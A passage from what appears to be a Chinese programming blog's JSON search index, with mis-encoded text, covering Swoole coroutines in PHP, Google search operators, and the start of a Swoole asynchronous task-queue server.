false;&#x2F;&#x2F;è¶…è¿‡100ä¸ç”¨æ’å…¥ &#125; echo &quot;æ’å…¥æ•°æ®&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;$i &#x3D; 0;while (true) &#123; $task1Result &#x3D; task1($i); $task2Result &#x3D; task2($i); $task3Result &#x3D; task3($i); if($task1Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task2Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task3Result&#x3D;&#x3D;&#x3D;false)&#123; break;&#x2F;&#x2F;å…¨éƒ¨ä»»åŠ¡å®Œæˆ,é€€å‡ºå¾ªç¯ &#125; $i++;&#125; swooleå®ç°åç¨‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;å†™å…¥æ–‡ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ usleep(3000); echo &quot;å†™å…¥æ–‡ä»¶&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;æŒ‚èµ·å½“å‰åç¨‹,0.001ç§’åæ¢å¤&#x2F;&#x2F;ç›¸å½“äºåˆ‡æ¢åç¨‹ &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;å‘é€é‚®ä»¶ç»™500åä¼šå‘˜,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;å‘é€é‚®ä»¶&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;æŒ‚èµ·å½“å‰åç¨‹,0.001ç§’åæ¢å¤&#x2F;&#x2F;ç›¸å½“äºåˆ‡æ¢åç¨‹ &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;æ¨¡æ‹Ÿæ’å…¥100æ¡æ•°æ®,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;æ’å…¥æ•°æ®&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;æŒ‚èµ·å½“å‰åç¨‹,0.001ç§’åæ¢å¤&#x2F;&#x2F;ç›¸å½“äºåˆ‡æ¢åç¨‹ &#125;&#125;$pid1 &#x3D; go(&#39;task1&#39;);&#x2F;&#x2F;goå‡½æ•°æ˜¯swooleçš„å¼€å¯åç¨‹å‡½æ•°ï¼Œç”¨äºå¼€å¯ä¸€ä¸ªåç¨‹$pid2 &#x3D; go(&#39;task2&#39;);$pid3 &#x3D; go(&#39;task3&#39;); åç¨‹ä¸å¤šè¿›ç¨‹ç”±ä¸Šé¢çš„ä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œåç¨‹å…¶å®åªæ˜¯è¿è¡Œåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­çš„å‡½æ•°ï¼Œåªæ˜¯è¿™ä¸ªå‡½æ•°ä¼šè¢«åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯âš ï¸ï¼š åç¨‹å¹¶ä¸æ˜¯å¤šä»»åŠ¡å¹¶è¡Œå¤„ç†ï¼Œå®ƒå±äºå¤šä»»åŠ¡ä¸²è¡Œå¤„ç†ï¼Œå®ƒä¿©çš„æœ¬è´¨åŒºåˆ«æ˜¯åœ¨æŸä¸ªæ—¶åˆ»åŒæ—¶æ‰§è¡Œä¸€ä¸ªè¿˜æ˜¯å¤šä¸ªä»»åŠ¡ã€‚ åç¨‹çš„ä½œç”¨åŸŸç”±äºåç¨‹å°±æ˜¯è¿›ç¨‹ä¸­ä¸€ä¸²ä»»åŠ¡ä»£ç ï¼Œæ‰€ä»¥å®ƒçš„å…¨å±€å˜é‡ã€é™æ€å˜é‡ç­‰å˜é‡éƒ½æ˜¯å…±äº«çš„ï¼ŒåŒ…æ‹¬ PHP çš„å…¨å±€ç¼“å†²åŒºã€‚ æ‰€ä»¥åœ¨å¼€å‘æ—¶ç‰¹åˆ«éœ€è¦æ³¨æ„ä½œç”¨åŸŸç›¸å…³çš„é—®é¢˜ã€‚ åç¨‹çš„I/Oè¿æ¥åœ¨åç¨‹ä¸­ï¼Œè¦ç‰¹åˆ«æ³¨æ„ä¸èƒ½å…±ç”¨ä¸€ä¸ª I/O è¿æ¥ï¼Œå¦åˆ™ä¼šé€ æˆæ•°æ®å¼‚å¸¸ã€‚ ç”±äºåç¨‹çš„äº¤å‰è¿è¡Œæœºåˆ¶ï¼Œä¸”å„ä¸ªåç¨‹çš„ I/O è¿æ¥éƒ½å¿…é¡»æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œè¿™æ—¶å¦‚æœä½¿ç”¨ä¼ ç»Ÿçš„ç›´æ¥å»ºç«‹è¿æ¥æ–¹å¼ï¼Œä¼šå¯¼è‡´æ¯ä¸ªåç¨‹éƒ½éœ€è¦å»ºç«‹è¿æ¥ã€é—­å…³è¿æ¥ï¼Œä»è€Œæ¶ˆè€—å¤§é‡èµ„æºã€‚é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³åç¨‹çš„ I/O è¿æ¥é—®é¢˜å‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°è¿æ¥æ± äº†ã€‚ è¿æ¥æ± å­˜åœ¨çš„æ„ä¹‰åœ¨äºï¼Œå¤ç”¨åŸæ¥çš„è¿æ¥ï¼Œä»è€ŒèŠ‚çœé‡å¤å»ºç«‹è¿æ¥æ‰€å¸¦æ¥çš„å¼€é”€ã€‚ åç¨‹çš„å®é™…åº”ç”¨åœºæ™¯è¯´äº†è¿™ä¹ˆå¤šï¼Œé‚£åç¨‹å€’åº•èƒ½è§£å†³å“ªäº›å®é™…ä¸šåŠ¡åœºæ™¯å‘¢ï¼Ÿä¸‹é¢é€šè¿‡ä¸€ä¸ªå®ä¾‹æ¥å¿«é€Ÿä¸Šæ‰‹åç¨‹ï¼ˆç¬”è€…å½“æ—¶å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼Œå¯¹åç¨‹çš„ç†è§£è¿˜ä¸å¤Ÿæ·±åˆ»ï¼Œæ‰€ä»¥è¿™é‡Œå¼•ç”¨zxr615 çš„â€åšé¥­â€œçš„ä¾‹å­æ¥ç†è§£åç¨‹ï¼‰ï¼š ä¼ ç»ŸåŒæ­¥é˜»å¡å®ç°é€»è¾‘ï¼š 12345678910111213141516171819202122232425&lt;?phpfunction cook()&#123; $startTime &#x3D; time(); echo &quot;å¼€å§‹ç…²æ±¤...&quot; . PHP_EOL; sleep(10); echo &quot;æ±¤å¥½äº†...&quot; . PHP_EOL; echo &quot;å¼€å§‹ç…®é¥­...&quot; . PHP_EOL; sleep(8); echo &quot;é¥­ç†Ÿäº†...&quot; . PHP_EOL; echo &quot;æ”¾æ²¹...&quot; . PHP_EOL; sleep(1); echo &quot;ç…é±¼...&quot; . PHP_EOL; sleep(3); echo &quot;æ”¾ç›...&quot; . PHP_EOL; sleep(1); echo &quot;å‡ºé”…...&quot; . PHP_EOL; var_dump(&#39;æ€»è€—æ—¶ï¼š&#39; . (time() - $startTime) . &#39; åˆ†é’Ÿ&#39;);&#125;cook(); åç¨‹å®ç°é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phpuse Swoole\\Coroutine;use Swoole\\Coroutine\\WaitGroup;use Swoole;class Cook&#123; public function cookByCo() &#123; $startTime &#x3D; time(); &#x2F;&#x2F; å¼€å¯ä¸€é”®åç¨‹åŒ–: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;runtime?id&#x3D;swoole_hook_all Swoole\\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªåç¨‹å®¹å™¨: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;scheduler &#x2F;&#x2F; ç›¸å½“äºè¿›å…¥å¨æˆ¿ \\Co\\run(function () &#123; &#x2F;&#x2F; ç­‰å¾…ç»“æœ: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;wait_group?id&#x3D;waitgroup &#x2F;&#x2F; è®°å½•å“ªé“èœåšå¥½äº†ï¼Œå“ªé“èœè¿˜éœ€è¦å¤šé•¿æ—¶é—´ $wg &#x3D; new WaitGroup(); &#x2F;&#x2F; ä¿å­˜æ•°æ®çš„ç»“æœ &#x2F;&#x2F; è£…å¥½çš„èœ $result &#x3D; []; &#x2F;&#x2F; è®°å½•ä¸€ä¸‹ç…²æ±¤(è®°å½•ä¸€ä¸ªä»»åŠ¡) $wg-&gt;add(); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªç…²æ±¤ä»»åŠ¡(å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;å¼€å§‹ç…²æ±¤...&quot; . PHP_EOL; &#x2F;&#x2F; ç…²æ±¤éœ€è¦6åˆ†é’Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸ç”¨åœ¨è¿™é‡Œç­‰æ±¤ç…®å¥½ï¼Œ &#x2F;&#x2F; ç›´æ¥å»åšä¸‹ä¸€ä¸ªä»»åŠ¡ï¼šç‚’èœ(åç¨‹åˆ‡æ¢) sleep(8); echo &quot;æ±¤å¥½äº†...&quot; . PHP_EOL; &#x2F;&#x2F; è£…ç›˜ $result[&#39;soup&#39;] &#x3D; &#39;ä¸€é”…æ±¤&#39;; $wg-&gt;done(); &#x2F;&#x2F; æ ‡è®°ä»»åŠ¡å®Œæˆ &#125;); &#x2F;&#x2F; è®°å½•ä¸€ä¸‹ç…®é¥­(è®°å½•ä¸€ä¸ªä»»åŠ¡) $wg-&gt;add(); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªç…®é¥­ä»»åŠ¡(å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;å¼€å§‹ç…®é¥­...&quot; . PHP_EOL; &#x2F;&#x2F; ç…®é¥­éœ€è¦5åˆ†é’Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨åœ¨è¿™é‡Œç­‰é¥­ç…®ç†Ÿï¼Œæ”¾åœ¨è¿™é‡Œä¸€ä¼šå†æ¥çœ‹çœ‹å¥½äº†æ²¡æœ‰ &#x2F;&#x2F; æˆ‘ä»¬å…ˆå»ç…²æ±¤(åç¨‹åˆ‡æ¢) sleep(10); echo &quot;é¥­ç†Ÿäº†...&quot; . PHP_EOL; &#x2F;&#x2F; è£…ç›˜ $result[&#39;rice&#39;] &#x3D; &#39;ä¸€é”…ç±³é¥­&#39;; $wg-&gt;done(); &#x2F;&#x2F; æ ‡è®°ä»»åŠ¡å®Œæˆ &#125;); &#x2F;&#x2F; è®°å½•ä¸€ä¸‹ç‚’èœ $wg-&gt;add(); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªç‚’èœä»»åŠ¡(å†å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹) Coroutine::create(function () use ($wg, &amp;$result) &#123; &#x2F;&#x2F; ç…é±¼çš„è¿‡ç¨‹å¿…é¡»æ”¾åœ¨ä¸€ä¸ªåç¨‹é‡Œé¢æ‰§è¡Œï¼Œå¦‚æœä¸æ˜¯çš„è¯å¯èƒ½é±¼è¿˜æ²¡ç…å¥½å°±å‡ºé”…äº† &#x2F;&#x2F; å› ä¸ºå¼€å¯åç¨‹åï¼ŒIOå…¨æ˜¯å¼‚æ­¥äº†ï¼Œåœ¨æ­¤demoä¸­æ¯æ¬¡é‡åˆ°sleepéƒ½ä¼šæŒ‚èµ·å½“å‰åç¨‹ &#x2F;&#x2F; åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªåç¨‹æ‰§è¡Œã€‚ &#x2F;&#x2F; ä¾‹å¦‚æŠŠå‡ºé”…è¿™ä¸€æ­¥å¼€å¯ä¸€ä¸ªæ–°åç¨‹æ‰§è¡Œï¼Œåˆ™åœ¨ç…é±¼çš„æ—¶å€™é±¼ï¼Œé±¼å°±å‡ºé”…äº†ã€‚ echo &quot;æ”¾æ²¹...&quot; . PHP_EOL; sleep(1); echo &quot;ç…é±¼...&quot; . PHP_EOL; sleep(3); echo &quot;æ”¾ç›...&quot; . PHP_EOL; sleep(1); echo &quot;å‡ºé”…...&quot; . PHP_EOL; &#x2F;&#x2F; è£…ç›˜ $result[&#39;food&#39;] &#x3D; &#39;é±¼é¦™è‚‰ä¸&#39;; $wg-&gt;done(); &#125;); &#x2F;&#x2F; ç­‰å¾…å…¨éƒ¨ä»»åŠ¡å®Œæˆ $wg-&gt;wait(); &#x2F;&#x2F; è¿”å›æ•°æ®(ä¸Šèœï¼) var_dump($result); &#125;); var_dump(&#39;æ€»è€—æ—¶ï¼š&#39; . (time() - $startTime) . &#39; åˆ†é’Ÿ&#39;); &#125;&#125;$cooker &#x3D; new Cook();$cooker-&gt;cookByCo(); é€šè¿‡æ‰§è¡Œä»£ç å¯ä»¥çœ‹åˆ°åç¨‹æ–¹å¼æ¯”ä¼ ç»Ÿé˜»å¡æ–¹å¼è¶³è¶³å¿«äº†åä¸‰åˆ†é’Ÿã€‚ä»åç¨‹æ–¹å¼å®ç°çš„é€»è¾‘ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æ— æ„ŸçŸ¥ç¼–å†™â€åŒæ­¥ä»£ç â€œï¼Œå´å®ç°äº†å¼‚æ­¥ I/O çš„æ•ˆæœå’Œæ€§èƒ½ã€‚é¿å…äº†ä¼ ç»Ÿå¼‚æ­¥å›è°ƒæ‰€å¸¦æ¥çš„ç¦»æ•£çš„ä»£ç é€»è¾‘å’Œé™·å…¥å¤šå±‚å›è°ƒä¸­å¯¼è‡´ä»£ç æ— æ³•ç»´æŠ¤ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä¼ ç»Ÿå›è°ƒçš„è§¦å‘æ¡ä»¶æ˜¯å›è°ƒå‡½æ•°ï¼Œè€Œåç¨‹åˆ‡æ¢çš„æ¡ä»¶æ˜¯é‡åˆ° I/Oã€‚ åç¨‹è¯¯åŒºå®é™…ä½¿ç”¨åç¨‹æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ä¸ªè¯¯åŒºï¼Œå¦åˆ™æ•ˆæœå¯èƒ½ä¼šäº‹å€åŠŸåŠã€‚ ç†è®ºä¸Šæ¥è®²ï¼Œåç¨‹è§£å†³çš„æ˜¯ I/O å¤ç”¨çš„é—®é¢˜ï¼Œå¯¹äºè®¡ç®—å¯†é›†çš„é—®é¢˜æ— æ•ˆã€‚ å¦‚æœcpuå¾ˆé—²(å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ¶ˆè€—åœ¨ç½‘ç»œç£ç›˜ä¸Šäº†)ï¼Œåç¨‹å°±å¯ä»¥æé«˜cpuçš„åˆ©ç”¨ç‡ å¦‚æœcpuæœ¬èº«å°±å¾ˆé¥±å’Œäº† ç”¨åç¨‹åè€Œä¼šé™ä½cpuåˆ©ç”¨ç‡ï¼ˆéœ€è¦èŠ±æ—¶é—´æ¥åšåç¨‹è°ƒåº¦ï¼‰ã€‚ swoole æ˜¯å•çº¿ç¨‹ å‚è€ƒé“¾æ¥ swoole å­¦ä¹ ç¬”è®°-åšä¸€é¡¿é¥­æ¥ç†è§£åç¨‹ åç¨‹-EasySwoole swoole åç¨‹-swoole é«˜æ‰‹ä¹‹è·¯ swooleä¸€ä¸ªåç¨‹é—®é¢˜ï¼Ÿä¸ºä»€ä¹ˆæ•ˆç‡å˜æ…¢äº†","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"å¦‚ä½•é«˜æ•ˆçš„åˆ©ç”¨è°·æ­Œæœç´¢å¼•æ“","slug":"how-to-use-google-search-engine-efficiently","date":"2020-11-28T09:03:14.000Z","updated":"2020-11-28T09:04:27.083Z","comments":true,"path":"how-to-use-google-search-engine-efficiently/","link":"","permalink":"https://www.0x2beace.com/how-to-use-google-search-engine-efficiently/","excerpt":"æ•´ç†è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†åˆååˆ†æœ‰ç”¨çš„Google æœç´¢å¼•æ“æœç´¢æŠ€å·§ã€‚","text":"æ•´ç†è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†åˆååˆ†æœ‰ç”¨çš„Google æœç´¢å¼•æ“æœç´¢æŠ€å·§ã€‚ æœç´¢å®Œå…¨åŒ¹é…çš„æœç´¢ç»“æœæœ‰æ—¶å€™æˆ‘ä»¬ä¼šæœ‰è¿™æ ·ä¸€ç§éœ€æ±‚ï¼šæˆ‘éœ€è¦æŸ¥æ‰¾æŸä¸ªå…³é”®å­—åŒæ—¶å‡ºç°çš„å†…å®¹ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°å®Œå…¨åŒ¹é…è¿™æ‹›äº†ã€‚ åœ¨å…³é”®å­—çš„å·¦å³ä¸¤è¾¹åˆ†åˆ«åŠ ä¸Š&quot;è‹±æ–‡çŠ¶æ€çš„åŒå¼•å·ï¼Œå¦‚ï¼š 1&quot;HHKB æ˜¯ä»€ä¹ˆ&quot; ä»æœç´¢ç»“æœä¸­æ’é™¤ç‰¹å®šè¯ä¸ºäº†è¿›ä¸€æ­¥ç­›é€‰æœç´¢ç»“æœï¼Œè¿˜éœ€è¦å­¦ä¼šå¦ä¸€æ‹›ï¼Œåˆ©ç”¨-å‡å·æ’é™¤ç‰¹å®šå…³é”®å­—ï¼š 1&quot;the most important benefit of education&quot;-&quot;unitedstates&quot; ä¸Šé¢è¿™æ®µè¡¨ç¤ºçš„æ„æ€æ˜¯ï¼šè¦æ±‚Google è¿”å›å«æœ‰â€the most important benefit of educationâ€ ä½†ä¸å­˜åœ¨â€unitedstatesâ€çš„å†…å®¹ã€‚ 1daddy -film daddy çš„æ„æ€æ˜¯çˆ¶äº²ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€éƒ¨ç”µå½±ï¼Œå½“ä½ æœç´¢â€daddyâ€ æ—¶ï¼Œè°·æ­Œåªè¿”å›æœ‰å…³ç”µå½±çš„å†…å®¹ã€‚å¦‚æœä½ åªæƒ³æœç´¢æ—¶å…³äºçˆ¶äº²ï¼Œè¦æ’é™¤ç”µå½±ï¼Œåœ¨éœ€è¦æ’é™¤çš„å‰é¢åŠ ä¸Š-ï¼Œä¾‹å¦‚ä¸Šé¢æ‰€ç¤ºã€‚ä½ ä¼šå‘ç°ç»“æœä¸­æ²¡æœ‰ä¸ç”µå½±æœ‰å…³çš„å†…å®¹ã€‚ æœç´¢é€šé…ç¬¦æˆ–æœªçŸ¥å­—è¯æ€æ ·ç”¨ï¼Ÿ å³æœç´¢å­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«æ˜Ÿå·*ï¼Œç”¨æ˜Ÿå·æ¥æ›¿ä»£ä»»æ„å­—ç¬¦ä¸²ã€‚ 1powerful*life æœç´¢ç¤¾äº¤åª’ä½“å½“ä½ åªæƒ³åœ¨æŸä¸ªç¤¾äº¤åª’ä½“é‡Œæ‰¾åˆ°ç›¸å…³å­—è¯æ—¶ï¼Œåœ¨ç”¨äºæœç´¢ç¤¾äº¤åª’ä½“çš„å­—è¯å‰åŠ ä¸Š@ï¼Œä¾‹å¦‚ï¼š 1@twice ç»„åˆæœç´¢åœ¨å„ä¸ªæœç´¢æŸ¥è¯¢å­—é—´åŠ ä¸Šâ€œORâ€å…³é”®å­—ï¼Œä¾‹å¦‚ï¼š 1race OR marathon æœç´¢åˆ°çš„ç»“æœä¼šè¿”å›å…³äº race æˆ–è€… marathonï¼Œæˆ–ä¸¤è€…å‡æœ‰çš„ç›¸å…³å†…å®¹ã€‚ æœç´¢ç‰¹å®šä»·æ ¼ç”¨è¿™ä¸ªæ–¹æ³•æ¥æœç´¢ç‰¹å®šä»·æ ¼çš„å•†å“ï¼Œä¾‹å¦‚æƒ³è¦æœç´¢ä»·æ ¼ä¸º$200çš„ä¹¦åŒ…ï¼Œå¯ä»¥è¿™æ ·æœç´¢ï¼š 1$200 bag åœ¨æŸä¸ªæ•°å­—èŒƒå›´å†…æ‰§è¡Œæœç´¢æ¯”å¦‚æƒ³è¦æœç´¢ä»‹äº $100 - $200 ä¹‹é—´çš„å•†å“ï¼Œæˆ–è€…æ˜¯ 10kg - 20kg çš„æŸç§ä¸œè¥¿ï¼Œäº¦æˆ–è€…æ˜¯ 1900 - 1945 å¹´å‘ç”Ÿçš„äº‹æƒ…ï¼Œç­‰ç­‰ã€‚ åœ¨ä¸¤ä¸ªæ•°å­—ä¹‹é—´åŠ ä¸Š..ç¬¦å·ï¼Œä¾‹å¦‚æœç´¢ä»·æ ¼ $50 - $100 çš„æ¡Œå­ï¼š 1amazon table $50..$100 æœç´¢ç‰¹å®šç½‘ç«™åªåœ¨ç‰¹å®šçš„ç½‘ç«™é‡Œæœç´¢ç›¸å…³èµ„æ–™ï¼Œåœ¨ç›¸åº”çš„åŸŸåå‰é¢åŠ ä¸Š&quot;site:&quot;ï¼Œä¾‹å¦‚è¦åœ¨ youtube é‡Œæ‰¾å…³äºçŒ«çš„ç”µå½±ï¼Œå¯ä»¥è¿™æ ·æœç´¢ï¼š 1site:youtube.com cat æœç´¢ç›¸å…³ç½‘ç«™æƒ³æ‰¾å’ŒæŸä¸ªç½‘ç«™æœ‰å…³ç³»æˆ–è€…ç›¸ä¼¼ç‰¹è´¨çš„ç½‘ç«™ï¼Œåœ¨å·²çŸ¥ç½‘å€å‰é¢åŠ ä¸Šrelated:ï¼Œä¾‹å¦‚ï¼š 1related:google.com google.com æ˜¯ä¸€ä¸ªæœç´¢ç½‘ç«™ï¼ŒåŠ ä¸Šrelated:å…³é”®å­—ä¹‹åï¼Œæœç´¢çš„ç»“æœæ˜¯å…¶ä»–æœç´¢å¼•æ“ï¼Œå¦‚ Yahooã€Bing ç­‰ å¯»æ‰¾ä¸»é¢˜æ ‡è®°åœ¨å…³é”®å­—å‰é¢åŠ ä¸Š#ç¬¦å·ï¼Œ è·å–ç½‘ç«™çš„ç›¸å…³èµ„æ–™å¦‚æœä½ æƒ³çŸ¥é“æŸä¸ªç½‘ç«™æ˜¯å…³äºä»€ä¹ˆçš„ï¼Œå¯ä»¥è¿™æ ·å­æœç´¢ï¼š 1info:baidu.com å¤šç»„åˆè¿ç”¨ åœ¨ channelnewsasia.com ç½‘ç«™é‡Œæœç´¢å…³äºå¤©ç¾çš„æ„å¤–ï¼Œé™¤äº†åœ°éœ‡ï¼Œå‘ç”Ÿåœ¨2012å¹´åˆ°2016å¹´ä¹‹é—´ã€‚ 1site:channelnewsasia.com ~accident &quot;natural disaster&quot; -earthquake 2012..2016 å…¶ä¸­æ³¢æµªç¬¦å·~è¡¨ç¤ºä¹Ÿæœç´¢å’Œè¿™ä¸ªå­—æœ‰å…³è”çš„å†…å®¹ï¼Œå¦‚ failureï¼Œcrashã€mishap ç­‰ ä»ä¸¤ä¸ªè´­ç‰©ç½‘ç«™æœç´¢æ‰‹è¡¨ï¼Œä»·æ ¼åœ¨ $100 åˆ° $200 ä¹‹é—´ 1site:shopee.com.my OR site:amazon.com watch $100..$200 ä»ebay ä¸ amazonç½‘ç«™æœç´¢è‹¹æœä¸å¾®è½¯çš„äº§å“ï¼Œæ’é™¤å¹³æ¿ç”µè„‘ 1site:ebay.com OR site:amazon.com apple OR microsoft -tablet åœ¨å‰éš†å¡ä¸€å¸¦æœç´¢ä½æ”¶è´¹ä½å®¿ï¼Œä»·æ ¼åœ¨$100 åˆ° $200 ä¹‹é—´ï¼Œæ’é™¤ airbnbï¼Œé è¿‘è½»å¿«åœ°é“ 1KL ~budget~accommodation $100..$200 -airbnb &quot;nearby LRT station&quot;","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"}]},{"title":"PHP + Swoole å®ç°å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—","slug":"php-swoole-to-achieve-asynchronous-task-queue","date":"2020-11-26T12:33:48.000Z","updated":"2020-11-27T13:54:36.939Z","comments":true,"path":"php-swoole-to-achieve-asynchronous-task-queue/","link":"","permalink":"https://www.0x2beace.com/php-swoole-to-achieve-asynchronous-task-queue/","excerpt":"æœ€è¿‘æ¥æ‰‹ä¸€ä¸ªå¯¹æ¥çŸ­ä¿¡çš„éœ€æ±‚ï¼Œè¿™ä¸ªéœ€æ±‚æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ï¼Œç›´æ¥æŒ‰ç…§æœåŠ¡å•†çš„è¦æ±‚è¯·æ±‚å…·ä½“çš„æ¥å£å°±å¥½äº†ã€‚","text":"æœ€è¿‘æ¥æ‰‹ä¸€ä¸ªå¯¹æ¥çŸ­ä¿¡çš„éœ€æ±‚ï¼Œè¿™ä¸ªéœ€æ±‚æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ï¼Œç›´æ¥æŒ‰ç…§æœåŠ¡å•†çš„è¦æ±‚è¯·æ±‚å…·ä½“çš„æ¥å£å°±å¥½äº†ã€‚ æœ€å¼€å§‹æ˜¯ä½¿ç”¨ä¼ ç»Ÿçš„åŒæ­¥é˜»å¡æ–¹å¼å®ç°äº†ä¸€éï¼Œç”¨æˆ·ä½“éªŒå¹¶ä¸å¥½ï¼Œå‘é€çŸ­ä¿¡éœ€è¦ç­‰å¾…ï¼Œç­‰å¾…æœåŠ¡å•†çš„æ¥å£è¿”å›å†…å®¹ï¼Œæ‰ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ å› ä¸ºæœ€è¿‘åœ¨å­¦ä¹ Swooleï¼ŒSwoole ä¸­æœ‰ä¸€ä¸ªâ€œå¼‚æ­¥ä»»åŠ¡â€ï¼Œå°±ç‰¹åˆ«é€‚åˆä»¥ä¸‹åº”ç”¨åœºæ™¯ï¼š éœ€è¦æ‰§è¡Œè€—æ—¶æ“ä½œï¼Œä¼šé˜»å¡ä¸»è¿›ç¨‹ ç”¨æˆ·ä¸éœ€è¦ç­‰å¾…è¿”å›ç»“æœ ç»“åˆå®˜ç½‘æ‰‹å†Œå’ŒLatent çš„åŸºäº swoole ä¸‹ å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ— APIï¼Œæœ€ç»ˆç®€å•å°è£…äº†ä¸€ä¸ªå¤„ç†API çš„ç±»ï¼Œå®ç°å¦‚ä¸‹ï¼š æœåŠ¡ç«¯æœåŠ¡ç«¯æ˜¯åŸºäºæœ¬åœ°Tcpï¼Œç›‘å¬9501ç«¯å£ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162&lt;?phpclass taskServer&#123; const HOST &#x3D; &quot;127.0.0.1&quot;; const PORT &#x3D; 9501; public $server &#x3D; null; public function __construct() &#123; $this-&gt;server &#x3D; new SWoole\\Server(self::HOST, self::PORT); $this-&gt;server-&gt;set(array( &quot;enable_coroutine&quot; &#x3D;&gt; false, &#x2F;&#x2F; å…³é—­åç¨‹ &quot;worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; å¼€å¯çš„è¿›ç¨‹æ•° ä¸€èˆ¬ä¸ºcupæ ¸æ•° 1-4 å€ &quot;task_worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; taskè¿›ç¨‹çš„æ•°é‡ &#39;daemonize&#39; &#x3D;&gt; true, &#x2F;&#x2F; ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨ )); &#x2F;&#x2F; æ³¨å†Œäº‹ä»¶ $this-&gt;server-&gt;on(&quot;connect&quot;, [$this, &quot;onConnect&quot;]); $this-&gt;server-&gt;on(&quot;receive&quot;, [$this, &quot;onReceive&quot;]); $this-&gt;server-&gt;on(&quot;close&quot;, [$this, &quot;onClose&quot;]); $this-&gt;server-&gt;on(&quot;task&quot;, [$this, &quot;onTask&quot;]); $this-&gt;server-&gt;on(&quot;finish&quot;, [$this, &quot;onFinish&quot;]); &#x2F;&#x2F; å¯ç”¨æœåŠ¡ $this-&gt;server-&gt;start(); &#125; &#x2F;** * ç›‘å¬è¿æ¥äº‹ä»¶ * @param $server * @param $fd *&#x2F; public function onConnect($server, $fd)&#123; echo &quot;è¿æ¥æˆåŠŸ&quot;.PHP_EOL; &#125; &#x2F;** * ç›‘å¬å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ * @param $server &quot;Server å¯¹è±¡&quot; * @param $fd &quot;å”¯ä¸€æ ‡ç¤º&quot; * @param $form_id * @param $data &quot;å®¢æˆ·ç«¯å‘é€çš„æ•°æ®&quot; *&#x2F; public function 